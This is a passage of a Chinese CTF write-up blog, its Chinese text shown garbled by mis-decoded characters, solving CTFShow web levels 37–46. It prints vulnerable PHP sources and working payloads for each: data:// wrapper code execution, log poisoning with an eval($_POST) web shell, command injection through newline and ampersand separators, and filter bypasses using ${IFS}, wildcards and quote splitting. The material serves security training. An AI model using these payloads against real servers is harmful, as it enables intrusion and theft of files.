<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>: 2020-09-04 00:49:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by: h1xa</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 03:37:11</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;375f8cad-2ba6-4f1f-8d69-bbd592bd1b1c&#125;&quot;</span>;&lt;br/&gt;</span><br></pre></td></tr></table></figure>

<p>ctfshow{375f8cad-2ba6-4f1f-8d69-bbd592bd1b1c}</p>
<h2 id="web37â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell"><a href="#web37â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell" class="headerlink" title="web37â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell"></a>web37â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ç™¾åº¦å¾—çŸ¥æ­¤é¢˜ä½¿ç”¨ ï¼š<br><strong>data://åè®®</strong>ï¼š<br><strong>æ¡ä»¶</strong>ï¼šallow_url_fopen:On allow_url_include:On<br><strong>ç”¨å¤„</strong>: phpç‰ˆæœ¬&gt;=5.2.0å¯ä»¥ä½¿ç”¨data://æ•°æ®å°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ç”¨æ¥æ‰§è¡ŒPHPä»£ç :<br><strong>ç”¨æ³•</strong>:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain; å‘½ä»¤</span></span><br><span class="line">data:<span class="comment">//text/plain;base64, base64ç¼–ç </span></span><br></pre></td></tr></table></figure>

<p>åœ¨æ­¤é¢˜å½“ä¸­å°è¯•ä½¿ç”¨:<br><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span> = base64 = PD9waHAgc3lzdGVtKCdscycpOz8+</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web37.png"></p>
<p>å› ä¸ºé¢˜ç›®ä¸­è¿‡æ»¤äº† flag,æ‰€ä»¥<?php system('tac flag.php');?>å°†å¤±æ•ˆ,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web37_1.png"></p>
<p>å¦‚å›¾å¾—åˆ°äº†flag<br><strong>æ–¹æ³•äºŒ:</strong><br>åˆ©ç”¨æ—¥å¿—:</p>
<ol>
<li>é¦–å…ˆåœ¨urlä¸­è®¿é—®ä¸å­˜åœ¨å†…å®¹ï¼Œè®©å…¶è®°å½•åˆ°æœåŠ¡å™¨çš„æ—¥å¿—æ–‡ä»¶ä¸­,æ­¤æ¬¡é¢˜ç›®ç¯å¢ƒçš„æ—¥å¿—è·¯å¾„ä¸º:<br>/var/log/nginx/access.log</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>â€‹    2.æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ä¸­æ˜¯å¦å¤šäº† ä¸€å¥è¯æœ¨é©¬:</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web37_2.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºå‘ç°å‘ç”Ÿäº†è½¬ç : ç©ºæ ¼: %20; &lt;:%3C; &gt;:%3E; [:%5B; ]:%5D; â€™ : %27</p>
<p>â€‹    3.èšå‰‘ or èœåˆ€ ç±»ä¼¼å·¥å…·è¿æ¥: but è¿æ¥å¤±è´¥</p>
<h2 id="web38â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell"><a href="#web38â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell" class="headerlink" title="web38â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell"></a>web38â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•ä¸€ï¼š</strong><br>ä¸ä¸Šä¸€é¢˜éƒ½ä½¿ç”¨ dataåè®®:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+</span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);<span class="meta">?&gt;</span> = base64 = PD9waHAgc3lzdGVtKCdscycpOz8+</span></span><br></pre></td></tr></table></figure>

<p>å°†å¾—åˆ°ç›®å½•ä¸‹çš„æ–‡ä»¶å¦‚å›¾:</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web38.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> system(&#x27;tac flag.php&#x27;);<span class="meta">?&gt;</span> = base64 = PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>

<p>å°†å¾—åˆ°flag.phpï¼š</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web38_1.png"></p>
<p><strong>æ–¹æ³•äºŒï¼š</strong><br>åˆ©ç”¨æ—¥å¿—æ–‡ä»¶å¾—åˆ°shellï¼Œæ—¥å¿—æ–‡ä»¶ç›®å½•: /var/log/nginx/access.log ä¸ web37 æ–¹æ³•äºŒç±»ä¼¼</p>
<h2 id="web39â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web39â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web39â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web39â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ol>
<li>ä»ç„¶æ˜¯ data:// åè®®ï¼›ls ä¸‹ç›®å½•</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// passthru()</span></span><br><span class="line"><span class="comment">// echo exec()ï¼Œexec() é»˜è®¤å›æ˜¾æœ€åä¸€è¡Œï¼Œecho exec() å®Œæ•´æ˜¾ç¤º</span></span><br><span class="line"><span class="comment">// echo shell_exec() shell_exec()é»˜è®¤æ— æ˜¾ç¤ºï¼Œecho shell_exec() å¯æ˜¾ç¤º</span></span><br><span class="line"><span class="comment">// </span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web39.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cat æ‰€æœ‰ få¼€å¤´çš„æ–‡ä»¶</span></span><br><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&#x27;cat f*&#x27;)<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web39_1.png"></p>
<h2 id="web40â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web40â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web40â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web40â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº† [0-9]æ•°å­—ï¼Œ~ï¼ŒÂ·ï¼Œ@, #, $, ^, &amp;, *, ä¸­æ–‡æ‹¬å·ï¼ˆï¼‰ï¼Œ-, =, +, {},[], : , â€™ , â€œ, é€—å·, &lt; &gt;, å°æ•°ç‚¹, ./, ? ,ä¸€å¤§å †</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=print_r(localeconv());</span><br><span class="line"><span class="comment">// localeconv() è¿”å›åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„å…¶ä¸­åŒ…å«å°æ•°ç‚¹ï¼Œæ­£å¥½é¢˜ç›®è¿‡æ»¤äº†å°æ•°ç‚¹</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=print_r(pos(localeconv()));</span><br><span class="line"><span class="comment">// pos() è·å–æ•°ç»„ä¸­å½“å‰å…ƒç´ çš„å€¼---&gt; . </span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40_1.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=print_r(scandir(pos(localeconv())));</span><br><span class="line"><span class="comment">// scandir() è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„---&gt; æ­¤æ—¶è·å–åˆ°çš„æ•°ç»„ä¸‹æ ‡ä¸º 1 çš„ä¸º ..</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40_2.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=print_r(array_reverse(scandir(pos(localeconv()))));</span><br><span class="line"><span class="comment">// array_reverse() ç¿»è½¬æ•°ç»„--&gt;å°† scandir() è·å–åˆ°çš„æ•°ç»„ä¸‹æ ‡ä¸º 1 çš„å˜ä¸º flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40_3.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=print_r(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line"><span class="comment">// next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚å³ä¸‹ä¸€ä¸ª ---&gt; flag.phpï¼›å¦‚è‹¥åœ¨ä¸Šä¸€æ­¥array_reverse()ä¸ç¿»è½¬å°†å¾—åˆ°: ..</span></span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸ªæŠ¥é”™ä¸ç®¡å®ƒã€‚</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40_4.png"></p>
<p>æ­¤æ—¶å·²ç»è¯»å–åˆ°äº† flag.php é‚£ä¹ˆå°±è¦å°†å…¶å†…å®¹æ˜¾ç¤ºå‡ºæ¥: å¯ä»¥ä½¿ç”¨ show_source() æˆ–è€… highlight_file() å¾—åˆ° flagã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=highlight_file(array_rand(array_flip((scandir(pos(localeconv()))))));</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40_5.png"></p>
<h2 id="web41â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web41â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web41â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web41â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><h2 id="web42â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”-gt-dev-null-2-gt-amp-1"><a href="#web42â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”-gt-dev-null-2-gt-amp-1" class="headerlink" title="web42â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€” &gt;/dev/null 2&gt;&amp;1"></a>web42â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€” &gt;/dev/null 2&gt;&amp;1</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> </span><br></pre></td></tr></table></figure>

<ol>
<li><blockquote>
<p>/dev/null<br>/dev/null ä½œç”¨æ˜¯å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ° /dev/nullä¸­ã€‚/dev/nullä»£è¡¨Linuxçš„ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œå¾€è¿™ä¸ªæ–‡ä»¶é‡Œé¢å†™å…¥çš„å†…å®¹éƒ½ä¼šä¸¢å¤±:â€œé»‘æ´â€ æ‰€ä»¥æ‰§è¡Œäº† &gt;/dev/null ä¹‹åï¼Œæ ‡å‡†è¾“å‡ºæ‰å…¥é»‘æ´ä¸å¤å­˜åœ¨ã€‚</p>
</blockquote>
</li>
<li><p>2&gt;&amp;1<br>é‡å®šå‘ç»‘å®šï¼Œ &amp; å¯ä»¥å°†ä¸¤ä¸ªè¾“å‡ºç»‘å®šåœ¨ä¸€èµ·ã€‚æ‰€ä»¥ é”™è¯¯è¾“å‡ºå°†å’Œæ ‡å‡†è¾“å‡ºåŒç”¨ä¸€ä¸ªæ–‡ä»¶æè¿°ã€‚<br>å› æ­¤ &gt;/dev/null 2&gt;&amp;1 æ‰§è¡Œåï¼šæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°/dev/nullä¸­(é»‘æ´),é”™è¯¯è¾“å‡ºé‡ç”¨æ¥æ ‡å‡†è¾“å‡ºçš„æè¿°ï¼Œå› æ­¤ä¹Ÿæ‰å…¥äº†é»‘æ´ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¡å‘½ä»¤ä¸ä¼šæœ‰ä»»ä½•æ˜¾ç¤ºï¼Œä¸ä¼šè¾“å‡ºä»»ä½•ä¿¡æ¯åˆ°æ§åˆ¶å°ï¼Œä¹Ÿä¸ä¼šæœ‰ä»»ä½•ä¿¡æ¯è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ã€‚</p>
</li>
</ol>
<p>æ‰€ä»¥æ­¤é¢˜è¦æŠŠ &gt;/dev/null 2&gt;&amp;1 è¿™éƒ¨åˆ†å†…å®¹æˆªæ–­:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%<span class="number">0</span>a <span class="comment">// %0a = å›è½¦</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span> <span class="comment">// %26 = &amp;</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span>%<span class="number">26</span> <span class="comment">// %26%26 = &amp;&amp;</span></span><br><span class="line">?c=tac flag.php|| <span class="comment">// || = ||</span></span><br><span class="line">?c=tac flag.php;ls</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web42.png"></p>
<h2 id="web43â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web43â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web43â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web43â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Š å¤š è¿‡æ»¤äº†å‘½ä»¤ <strong>cat</strong> å’Œ <strong>åˆ†å·</strong> ,å¯ä»¥ä½¿ç”¨ <strong>câ€™â€™at</strong> æˆ–è€… <strong>tac</strong> æˆ–è€… <strong>less/more</strong>(éœ€è¦æŸ¥çœ‹æºä»£ç ) æˆ–è€… <strong>tail</strong> æˆ–è€… <strong>nl(è¯»å–è¡Œå·æŸ¥çœ‹æºä»£ç )</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ca<span class="string">&#x27;&#x27;</span>t flag.php%<span class="number">0</span>a /%<span class="number">26</span> /||</span><br><span class="line">?c=tac flag.php%<span class="number">0</span>a /%<span class="number">26</span> /||</span><br><span class="line">?c=less flag.php%<span class="number">0</span>a /%<span class="number">26</span> /||</span><br><span class="line">â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä½¿ç”¨ less flag.php%0a</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web43.png"></p>
<h2 id="web44â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web44â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web44â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web44â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Š å¤š è¿‡æ»¤äº†ä¸€ä¸ª <strong>flag</strong>,å› æ­¤:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=cat f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=less f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=less f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=more f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=more f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tail f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tail f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=nl f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=nl f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web44.png"></p>
<h2 id="web45â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web45â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web45â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web45â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Š å¤š è¿‡æ»¤äº† <strong>ç©ºæ ¼</strong>;å› æ­¤éœ€è¦ç»•è¿‡ç©ºæ ¼:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// %09:tab ä»£æ›¿ç©ºæ ¼</span></span><br><span class="line"><span class="comment">// $&#123;IFS&#125; ä»£æ›¿ç©ºæ ¼</span></span><br><span class="line">?c=tac%<span class="number">09</span>f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac$&#123;IFS&#125;%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>IFS : Internal Field Separator : å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦<br>$IFS é»˜è®¤ç©ºå­—ç¬¦(ç©ºæ ¼, tab, \n)</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web45.png"></p>
<h2 id="web46â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web46â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web46â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web46â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
